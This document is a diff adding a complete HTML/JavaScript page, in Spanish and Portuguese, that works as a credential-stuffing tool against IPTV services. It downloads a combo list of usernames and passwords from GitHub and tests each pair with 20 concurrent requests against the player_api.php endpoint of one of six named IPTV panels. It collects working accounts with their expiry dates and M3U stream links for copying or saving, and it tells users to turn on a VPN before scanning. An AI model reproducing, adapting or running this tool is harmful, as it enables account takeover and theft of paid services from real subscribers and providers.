@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="es-pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>GENERADOR DE LISTAS IPT BY AF1CIONADOS</title>
+  <style>
+    body {
+      background: #0a0a0a;
+      color: #00bfff;
+      font-family: 'Courier New', Courier, monospace;
+      padding: 20px;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    
+    .header-text {
+      text-align: center;
+      margin-bottom: 0; /* Modificación: se eliminó el margen inferior */
+      color: #00bfff;
+      font-size: 2em;
+      font-weight: 900;
+      text-shadow: 0 0 20px #00bfff, 0 0 40px #00bfff;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+    }
+    
+    h1 {
+      text-align: center;
+      margin-bottom: 20px;
+      text-shadow: 0 0 15px #00bfff, 0 0 30px #00bfff;
+      font-weight: 900;
+      font-size: 1.5em;
+      color: #00bfff;
+    }
+    label {
+      font-weight: bold;
+      display: block;
+      margin-top: 10px;
+      color: #00bfff;
+    }
+    input[type=text], input[type=file], select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 6px;
+      background: #1a1a1a;
+      border: 2px solid #00bfff;
+      color: #00bfff;
+      font-size: 16px;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+    input[type=text]:focus, select:focus {
+      outline: none;
+      border-color: #0080ff;
+      box-shadow: 0 0 10px #00bfff;
+    }
+    button {
+      margin-top: 15px;
+      padding: 14px 20px;
+      font-size: 20px;
+      background: #00bfff;
+      color: #0a0a0a;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      width: 100%;
+      font-weight: 700;
+      box-shadow: 0 0 15px #00bfff;
+    }
+    button:disabled {
+      background: #004080;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+    button:hover:not(:disabled) {
+      background: #0080ff;
+      box-shadow: 0 0 25px #00bfff;
+      transform: translateY(-2px);
+    }
+    
+    /* Estilo especial para o botão unificado */
+    #unifiedBtn {
+      background: linear-gradient(45deg, #ff8c00, #00ff80, #00bfff);
+      background-size: 300% 300%;
+      animation: gradientShift 3s ease infinite;
+      color: #0a0a0a;
+      font-size: 22px;
+      font-weight: 900;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      box-shadow: 0 0 25px rgba(0, 191, 255, 0.8);
+      border: 2px solid #00bfff;
+    }
+    
+    #unifiedBtn:hover:not(:disabled) {
+      transform: translateY(-3px);
+      box-shadow: 0 0 35px rgba(0, 191, 255, 1);
+    }
+    
+    #unifiedBtn:disabled {
+      background: #004080;
+      animation: none;
+      color: #666;
+    }
+    
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    
+    #status {
+      margin-top: 20px;
+      font-size: 18px;
+      text-align: center;
+      font-weight: 700;
+      color: #00bfff;
+      text-shadow: 0 0 10px #00bfff;
+    }
+    #hits {
+      margin-top: 20px;
+      flex-grow: 1;
+      max-height: 50vh;
+      overflow-y: auto;
+      scrollbar-width: thin;
+      scrollbar-color: #00bfff transparent;
+    }
+    #hits::-webkit-scrollbar {
+      width: 8px;
+    }
+    #hits::-webkit-scrollbar-thumb {
+      background-color: #00bfff;
+      border-radius: 4px;
+    }
+    .hit-card {
+      background: #001a33;
+      border: 2px solid #00bfff;
+      border-radius: 10px;
+      padding: 18px 18px 50px 18px;
+      margin-bottom: 14px;
+      box-shadow: 0 0 20px #00bfff55;
+      line-height: 1.6em;
+      font-size: 16px;
+      position: relative;
+      word-break: break-word;
+    }
+    .hit-title {
+      font-size: 1.3em;
+      font-weight: 900;
+      color: #00ff80;
+      margin-bottom: 10px;
+      text-shadow: 0 0 10px #00ff80;
+    }
+    .copy-btn {
+      position: absolute;
+      bottom: 12px;
+      right: 12px;
+      background: #00bfff;
+      color: #0a0a0a;
+      border: none;
+      border-radius: 6px;
+      padding: 6px 10px;
+      font-weight: 700;
+      font-size: 14px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 10px #00bfff;
+    }
+    .copy-btn:hover {
+      background: #0080ff;
+      box-shadow: 0 0 15px #00bfff;
+    }
+    #copyAllBtn {
+      background: #00bfff;
+      color: #0a0a0a;
+      margin-top: 20px;
+      font-size: 18px;
+      font-weight: bold;
+      box-shadow: 0 0 15px #00bfff;
+    }
+    #copyAllBtn:hover {
+      background: #0080ff;
+      box-shadow: 0 0 25px #00bfff;
+    }
+    #saveHitsBtn {
+      background: #ff6b35;
+      color: #0a0a0a;
+      margin-top: 10px;
+      font-size: 18px;
+      font-weight: bold;
+      box-shadow: 0 0 15px #ff6b35;
+    }
+    #saveHitsBtn:hover:not(:disabled) {
+      background: #e55a2b;
+      box-shadow: 0 0 25px #ff6b35;
+    }
+    #saveHitsBtn:disabled {
+      background: #663317;
+      color: #666;
+    }
+    
+    /* Animação para o texto do cabeçalho */
+    @keyframes neonGlow {
+      0%, 100% {
+        text-shadow: 0 0 20px #00bfff, 0 0 40px #00bfff, 0 0 60px #00bfff;
+      }
+      50% {
+        text-shadow: 0 0 10px #00bfff, 0 0 20px #00bfff, 0 0 30px #00bfff;
+      }
+    }
+    
+    .header-text {
+      animation: neonGlow 2s ease-in-out infinite;
+    }
+
+    .unified-status {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #00ff80;
+      text-align: center;
+      min-height: 20px;
+    }
+  </style>
+</head>
+<body>
+    <img id="logo" src="https://i.postimg.cc/K8T6YMR7/logo8-3-18594.png" alt="Logo" style="display: block; margin: 0 auto; max-width: 300px; height: auto;" />
+    <div class="container">
+        <div class="header-text">
+            GENERADOR DE LISTAS IPT BY AF1CIONADOS 
+        </div>
+        
+  <h1>ANTES DEL ESCANEO ACTIVA UN VPN</h1>
+
+  <button id="unifiedBtn">🚀 INICIAR ESCANEO COMPLETO 🚀</button>
+  <div id="unifiedStatus" class="unified-status"></div>
+  
+  <button id="stopBtn" disabled>PARAR ESCANEO</button>
+
+  <div id="status">Estado: Parado | Hits: 0 | Fallas: 0</div>
+
+  <button id="copyAllBtn" style="display:none;">Copiar Todos los Hits</button>
+  <button id="saveHitsBtn" style="display:none;">Guardar los Hits en Un Archivo TXT</button>
+  <div id="hits"></div>
+
+<script>
+(() => {
+  // Crear input oculto para el panel
+  const panelInput = document.createElement('input');
+  panelInput.type = 'hidden';
+  panelInput.id = 'panel';
+  document.body.appendChild(panelInput);
+  
+  const unifiedBtn = document.getElementById('unifiedBtn');
+  const unifiedStatus = document.getElementById('unifiedStatus');
+  const stopBtn = document.getElementById('stopBtn');
+  const statusDiv = document.getElementById('status');
+  const hitsDiv = document.getElementById('hits');
+  const copyAllBtn = document.getElementById('copyAllBtn');
+  const saveHitsBtn = document.getElementById('saveHitsBtn');
+
+  let combos = [];
+  let running = false;
+  let hits = [];
+  let fails = 0;
+  let currentIndex = 0;
+  let concurrency = 20; // Fixado em 20 bots
+
+  // URL do arquivo combo no GitHub
+  const COMBO_URL = 'https://raw.githubusercontent.com/annabueno2525-lgtm/anna/refs/heads/main/combo%20moto.txt';
+
+  // Links de servidores IPTV
+  const IPTV_SERVERS = [
+    'http://peercast.sbs',
+    'http://newoneblack.site',
+    'http://sualista.xyz',
+    'http://clienteplay.com',
+    'http://detran.sbs',
+    'http://oneplay.cc:80'
+  ];
+
+  function sanitizePanel(input) {
+    input = input.trim();
+    return input.replace(/^https?:\/\//, '');
+  }
+
+  // Funcion para seleccionar un servidor IPTV aleatoriamente
+  function selectRandomIptvServer() {
+    const randomIndex = Math.floor(Math.random() * IPTV_SERVERS.length);
+    const selectedServer = IPTV_SERVERS[randomIndex];
+    panelInput.value = selectedServer;
+    return selectedServer;
+  }
+
+  // Funcion para cargar el archivo combo de GitHub
+  async function loadComboFromGitHub() {
+    try {
+      unifiedStatus.textContent = '📥 Bajando el arhivo combo...';
+      unifiedStatus.style.color = '#00bfff';
+
+      const response = await fetch(COMBO_URL);
+      if (!response.ok) {
+        throw new Error(`Erro HTTP: ${response.status}`);
+      }
+
+      const text = await response.text();
+      combos = text.split(/\r?\n/).filter(l => l.includes(':'));
+      
+      if (combos.length === 0) {
+        throw new Error('Ningun combo válido encontrado en el arhivo');
+      }
+
+      unifiedStatus.textContent = `✅ Archivo Cargado! ${combos.length} combos encontrados.`;
+      unifiedStatus.style.color = '#00ff80';
+      return true;
+
+    } catch (error) {
+      unifiedStatus.textContent = `❌ Error Al Cargar El Archivo: ${error.message}`;
+      unifiedStatus.style.color = '#ff4444';
+      combos = [];
+      return false;
+    }
+  }
+
+  // Função unificada que executa todas as três operações
+  async function executeUnifiedScan() {
+    if (running) return;
+
+    try {
+      unifiedBtn.disabled = true;
+      unifiedBtn.textContent = '⏳ PREPARANDO ESCANEO...';
+      
+      // Passo 1: Seleccionar servidor aleatorio
+      unifiedStatus.textContent = '🎲 SELECCIONANDO SERVIDOR ALEATORIO...';
+      unifiedStatus.style.color = '#ff8c00';
+      const selectedServer = selectRandomIptvServer();
+      
+      // Espera Un Poco Para Mostrar El progresso
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      
+      unifiedStatus.textContent = `🎯 SERVIDOR SELECCIONADO: ${selectedServer}`;
+      
+      // Paso 2: Cargar combos
+      await new Promise(resolve => setTimeout(resolve, 500));
+      const comboLoaded = await loadComboFromGitHub();
+      
+      if (!comboLoaded) {
+        throw new Error('Fallo al cargar el archivo combo');
+      }
+      
+      // Passo 3: Iniciar scaneo
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      unifiedStatus.textContent = '🚀 INICIANDO ESCANEO...';
+      unifiedStatus.style.color = '#00bfff';
+      
+      // Inicializar variás veces el scaneo
+      running = true;
+      currentIndex = 0;
+      hits = [];
+      fails = 0;
+      hitsDiv.innerHTML = '';
+      statusDiv.textContent = 'Estado: Iniciando Escaneo | Hits: 0 | Fallas: 0';
+      stopBtn.disabled = false;
+      copyAllBtn.style.display = 'none';
+      saveHitsBtn.style.display = 'none';
+      // concurrency já está fixado em 20
+      
+      unifiedBtn.textContent = '✅ ESCANEO EJECUTANDOSE';
+      unifiedStatus.textContent = '⚡ ESCANEANDO SEA PACIENTE...⚡';
+      
+      // Iniciar el proceso de scaneo
+      scanNext();
+      
+    } catch (error) {
+      unifiedStatus.textContent = `❌ Error: ${error.message}`;
+      unifiedStatus.style.color = '#ff4444';
+      unifiedBtn.disabled = false;
+      unifiedBtn.textContent = '🚀 INICIAR ESCANEO COMPLETO 🚀';
+    }
+  }
+
+  // Event listener para o botão unificado
+  unifiedBtn.addEventListener('click', executeUnifiedScan);
+
+  stopBtn.addEventListener('click', () => {
+    running = false;
+    statusDiv.textContent = `Status: Parado | Hits: ${hits.length} | Falhas: ${fails}`;
+    unifiedBtn.disabled = false;
+    unifiedBtn.textContent = '🚀 INICIAR ESCANEO COMPLETO 🚀';
+    unifiedStatus.textContent = '⏹️ Escaneo interrumpido por el usuário';
+    unifiedStatus.style.color = '#ff8c00';
+    stopBtn.disabled = true;
+  });
+
+  function copyTextToClipboard(text) {
+    if (navigator.clipboard && window.isSecureContext) {
+      navigator.clipboard.writeText(text).then(() => {
+        alert("Hits Copiados con Exito!");
+      }).catch(() => {
+        fallbackCopy(text);
+      });
+    } else {
+      fallbackCopy(text);
+    }
+  }
+
+  function fallbackCopy(text) {
+    const textarea = document.createElement("textarea");
+    textarea.value = text;
+    textarea.style.position = "fixed";
+    textarea.style.opacity = 0;
+    document.body.appendChild(textarea);
+    textarea.focus();
+    textarea.select();
+    try {
+      document.execCommand('copiar');
+      alert("Hits Copiados con Exito!");
+    } catch {
+      alert("Error Al Copiar! Pressione para Copiar Manualmente.");
+    }
+    document.body.removeChild(textarea);
+  }
+
+  // Funcion para salvar hits en archivo TXT
+  function saveHitsToFile() {
+    if (!hits.length) {
+      alert("No Hay Hits Encontrados para Guardar!");
+      return;
+    }
+
+    const texto = hits.map(hit => 
+`Escaneo IPT by AF1CIONADOS 
+Servidor: http://${hit.painel}
+Usuário: ${hit.usuario}
+Contraseña: ${hit.senha}
+Expira: ${hit.exp || 'Ilimitado'}
+Conexiones: ${hit.active_cons || '?'}
+-----------------------------
+Lista M3U 👇 : ${hit.m3u}
+-----------------------------`
+    ).join('\n\n');
+
+    // Crear elemento de descarga
+    const blob = new Blob([texto], { type: 'text/plain;charset=utf-8' });
+    const url = window.URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    
+    // Nombre del archivo con fecha y hora
+    const now = new Date();
+    const timestamp = now.toISOString().slice(0, 19).replace(/[T:]/g, '-');
+    a.download = `hits_iptv_${timestamp}.txt`;
+    
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    window.URL.revokeObjectURL(url);
+    
+    alert(`Archivo Guardado Con Exito! ${hits.length} hits salvos.`);
+  }
+
+  copyAllBtn.addEventListener('click', () => {
+    if (!hits.length) return;
+    const texto = hits.map(hit => 
+`Escaneo IPT by Af1cionados\nServidor: http://${hit.painel}\nUsuário: ${hit.usuario}\nContraseña: ${hit.senha}\nExpira: ${hit.exp || 'Ilimitado'}\nConexiones: ${hit.active_cons || '?'}\n-----------------------------\nLista M3U 👇: ${hit.m3u}\n-----------------------------`
+    ).join('\n\n');
+    copyTextToClipboard(texto);
+  });
+
+  // Event listener para o botão de salvar hits
+  saveHitsBtn.addEventListener('click', saveHitsToFile);
+
+  function addHit(hit) {
+    hits.push(hit);
+    const card = document.createElement('div');
+    card.className = 'hit-card';
+    const texto = `Escaneo IPT by AF1CIONADOS \nServidor: http://${hit.painel}\nUsuário: ${hit.usuario}\nContraseña: ${hit.senha}\nExpira: ${hit.exp || 'Ilimitado'}\nConexiones: ${hit.active_cons || '?'}\n-----------------------------\nLista M3U 👇: ${hit.m3u}\n-----------------------------`
+
+    card.innerHTML = `
+      <div class="hit-title">LISTA HIT ENCONTRADO!</div>
+      ${texto.replace(/\n/g, '<br>')}
+      <br><br>
+      <button class="copy-btn">Copiar</button>
+    `;
+
+    card.querySelector('.copy-btn').addEventListener('click', () => {
+      copyTextToClipboard(texto);
+    });
+
+    hitsDiv.appendChild(card);
+    updateStatus();
+    copyAllBtn.style.display = 'block';
+    saveHitsBtn.style.display = 'block';
+  }
+
+  async function checkCombo(panel, usuario, senha) {
+    try {
+      // Construir URL para API
+      const urlBase = `http://${panel}/player_api.php?username=${encodeURIComponent(usuario)}&password=${encodeURIComponent(senha)}&type=m3u`;
+
+      let fetchUrl = urlBase;
+
+      const response = await fetch(fetchUrl, {
+        method: 'GET',
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        },
+        signal: AbortSignal.timeout(10000)
+      });
+
+      if (!response.ok) {
+        throw new Error(`HTTP ${response.status}`);
+      }
+
+      const text = await response.text();
+
+      // Verificar se es una respuesta válida de IPTV
+      if (text.includes('#EXTM3U') || text.includes('user_info') || text.includes('server_info')) {
+        // Intentar obtener información del usuário
+        const userInfoUrl = `http://${panel}/player_api.php?username=${encodeURIComponent(usuario)}&password=${encodeURIComponent(senha)}&action=get_user_info`;
+        
+        try {
+          const userResponse = await fetch(userInfoUrl, {
+            method: 'GET',
+            headers: {
+              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            },
+            signal: AbortSignal.timeout(5000)
+          });
+
+          let userInfo = {};
+          if (userResponse.ok) {
+            const userText = await userResponse.text();
+            try {
+              userInfo = JSON.parse(userText);
+            } catch {}
+          }
+
+          const hit = {
+            painel: panel,
+            usuario: usuario,
+            senha: senha,
+            m3u: urlBase,
+            exp: userInfo.exp_date || 'Ilimitado',
+            active_cons: userInfo.active_cons || '?'
+          };
+
+          addHit(hit);
+          return true;
+        } catch {
+          // Se falhar ao obter user info, ainda considera como hit
+          const hit = {
+            painel: panel,
+            usuario: usuario,
+            senha: senha,
+            m3u: urlBase,
+            exp: 'Ilimitado',
+            active_cons: '?'
+          };
+
+          addHit(hit);
+          return true;
+        }
+      } else {
+        return false;
+      }
+    } catch (error) {
+      return false;
+    }
+  }
+
+  function updateStatus() {
+    statusDiv.textContent = `Estado: ${running ? 'Escaneando' : 'Parado'} | Hits: ${hits.length} | Fallas: ${fails} | Progreso: ${currentIndex}/${combos.length}`;
+    
+    if (running && hits.length > 0) {
+      unifiedStatus.textContent = `🎯 ${hits.length} hits encontrados!`;
+      unifiedStatus.style.color = '#00ff80';
+    }
+  }
+
+  async function scanNext() {
+    if (!running) return;
+
+    const workers = [];
+    const batchSize = Math.min(concurrency, combos.length - currentIndex);
+
+    for (let i = 0; i < batchSize && currentIndex < combos.length; i++) {
+      const combo = combos[currentIndex++];
+      const [usuario, senha] = combo.split(':');
+      const panel = sanitizePanel(panelInput.value);
+
+      workers.push(
+        checkCombo(panel, usuario, senha).then(success => {
+          if (!success) fails++;
+          updateStatus();
+        }).catch(() => {
+          fails++;
+          updateStatus();
+        })
+      );
+    }
+
+    if (workers.length > 0) {
+      await Promise.all(workers);
+      
+      if (running && currentIndex < combos.length) {
+        setTimeout(scanNext, 100);
+      } else if (running) {
+        // Escaneo concluído
+        running = false;
+        unifiedBtn.disabled = false;
+        unifiedBtn.textContent = '🚀 INICIAR ESCANEO COMPLETO 🚀';
+        unifiedStatus.textContent = `✅ Escaneo concluído! ${hits.length} Hits Encontrados.`;
+        unifiedStatus.style.color = '#00ff80';
+        stopBtn.disabled = true;
+        statusDiv.textContent = `Estado: Concluído | Hits: ${hits.length} | Falhas: ${fails}`;
+      }
+    }
+  }
+})();
+</script>
+</body>
+</html>
